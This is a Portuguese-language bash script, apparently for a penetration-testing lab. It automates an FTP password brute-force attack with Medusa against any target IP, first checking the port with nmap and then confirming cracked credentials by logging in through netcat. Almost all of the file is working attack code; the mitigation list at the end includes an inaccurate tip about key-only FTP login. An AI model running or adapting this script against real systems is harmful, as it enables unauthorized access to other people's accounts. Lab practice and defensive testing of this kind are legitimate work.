#!/bin/bash

##############################################################################
# Script: Test FTP Brute Force Attack
# Descrição: Automatiza teste de força bruta em serviço FTP
# Uso: ./test-ftp.sh <IP_ALVO> [USERNAME]
##############################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Variáveis
TARGET_IP="${1:-192.168.56.3}"
USERNAME="${2:-msfadmin}"
WORDLIST="../wordlists/ftp-passwords.txt"
LOG_DIR="../logs"
LOG_FILE="$LOG_DIR/ftp-test-$(date +%Y%m%d-%H%M%S).log"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║        FTP BRUTE FORCE TEST - AMBIENTE CONTROLADO          ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Verificações iniciais
echo -e "${YELLOW}[*] Verificando pré-requisitos...${NC}"

# Criar diretório de logs se não existir
mkdir -p "$LOG_DIR"

# Verificar se Medusa está instalado
if ! command -v medusa &> /dev/null; then
    echo -e "${RED}[✗] Medusa não encontrado!${NC}"
    echo "    Instale com: sudo apt install medusa"
    exit 1
fi
echo -e "${GREEN}[✓] Medusa instalado${NC}"

# Verificar se wordlist existe
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[✗] Wordlist não encontrada: $WORDLIST${NC}"
    exit 1
fi
WORDLIST_SIZE=$(wc -l < "$WORDLIST")
echo -e "${GREEN}[✓] Wordlist encontrada ($WORDLIST_SIZE senhas)${NC}"

# Verificar conectividade
echo -e "\n${YELLOW}[*] Verificando conectividade com alvo...${NC}"
if ! ping -c 2 -W 2 "$TARGET_IP" &> /dev/null; then
    echo -e "${RED}[✗] Não foi possível alcançar $TARGET_IP${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Alvo $TARGET_IP está acessível${NC}"

# Verificar se porta FTP está aberta
echo -e "\n${YELLOW}[*] Verificando serviço FTP...${NC}"
if ! nmap -p 21 "$TARGET_IP" 2>/dev/null | grep -q "open"; then
    echo -e "${RED}[✗] Porta 21/FTP não está aberta em $TARGET_IP${NC}"
    exit 1
fi

# Detectar versão do FTP
FTP_VERSION=$(nmap -sV -p 21 "$TARGET_IP" 2>/dev/null | grep "21/tcp" | awk '{print $3, $4, $5}')
echo -e "${GREEN}[✓] Serviço FTP detectado: $FTP_VERSION${NC}"

# Confirmação
echo -e "\n${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Parâmetros do Teste:${NC}"
echo -e "  Alvo........: ${GREEN}$TARGET_IP${NC}"
echo -e "  Usuário.....: ${GREEN}$USERNAME${NC}"
echo -e "  Wordlist....: ${GREEN}$WORDLIST${NC}"
echo -e "  Senhas......: ${GREEN}$WORDLIST_SIZE${NC}"
echo -e "  Log.........: ${GREEN}$LOG_FILE${NC}"
echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"

read -p "Deseja continuar? (s/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Ss]$ ]]; then
    echo -e "${RED}[!] Teste cancelado pelo usuário${NC}"
    exit 0
fi

# Executar ataque
echo -e "\n${BLUE}[*] Iniciando ataque de força bruta...${NC}"
echo -e "${YELLOW}    Aguarde, isso pode levar alguns minutos...${NC}\n"

START_TIME=$(date +%s)

# Executar Medusa e salvar saída
medusa -h "$TARGET_IP" -u "$USERNAME" -P "$WORDLIST" -M ftp -t 4 -f 2>&1 | tee "$LOG_FILE"

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

# Analisar resultados
echo -e "\n${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}[*] Análise de Resultados:${NC}"

if grep -q "ACCOUNT FOUND" "$LOG_FILE"; then
    PASSWORD=$(grep "ACCOUNT FOUND" "$LOG_FILE" | awk '{print $NF}')
    echo -e "${GREEN}[✓] CREDENCIAL ENCONTRADA!${NC}"
    echo -e "    Usuário...: ${GREEN}$USERNAME${NC}"
    echo -e "    Senha.....: ${GREEN}$PASSWORD${NC}"
    echo -e "    Tempo.....: ${GREEN}${DURATION}s${NC}"
    
    # Validar acesso
    echo -e "\n${YELLOW}[*] Validando acesso FTP...${NC}"
    if echo -e "USER $USERNAME\nPASS $PASSWORD\nQUIT" | nc -w 5 "$TARGET_IP" 21 | grep -q "230 Login successful"; then
        echo -e "${GREEN}[✓] Acesso FTP validado com sucesso!${NC}"
    else
        echo -e "${RED}[!] Não foi possível validar o acesso${NC}"
    fi
else
    echo -e "${RED}[✗] Nenhuma credencial encontrada${NC}"
    echo -e "    Tempo.....: ${DURATION}s"
fi

echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"

# Estatísticas
echo -e "\n${BLUE}[*] Estatísticas do Teste:${NC}"
TOTAL_ATTEMPTS=$(grep -c "Trying" "$LOG_FILE" 2>/dev/null || echo "N/A")
echo -e "    Total de tentativas: $TOTAL_ATTEMPTS"
echo -e "    Taxa: $((WORDLIST_SIZE / (DURATION > 0 ? DURATION : 1))) tentativas/segundo"

# Recomendações
echo -e "\n${BLUE}[*] Recomendações de Mitigação:${NC}"
echo -e "    1. Desabilitar login FTP com senha (usar apenas chaves)"
echo -e "    2. Implementar Fail2Ban para bloquear IPs após tentativas falhas"
echo -e "    3. Limitar acesso FTP por IP (firewall)"
echo -e "    4. Usar FTPS (FTP over TLS) ao invés de FTP"
echo -e "    5. Monitorar logs: /var/log/vsftpd.log"

echo -e "\n${GREEN}[✓] Teste concluído! Log salvo em: $LOG_FILE${NC}\n"
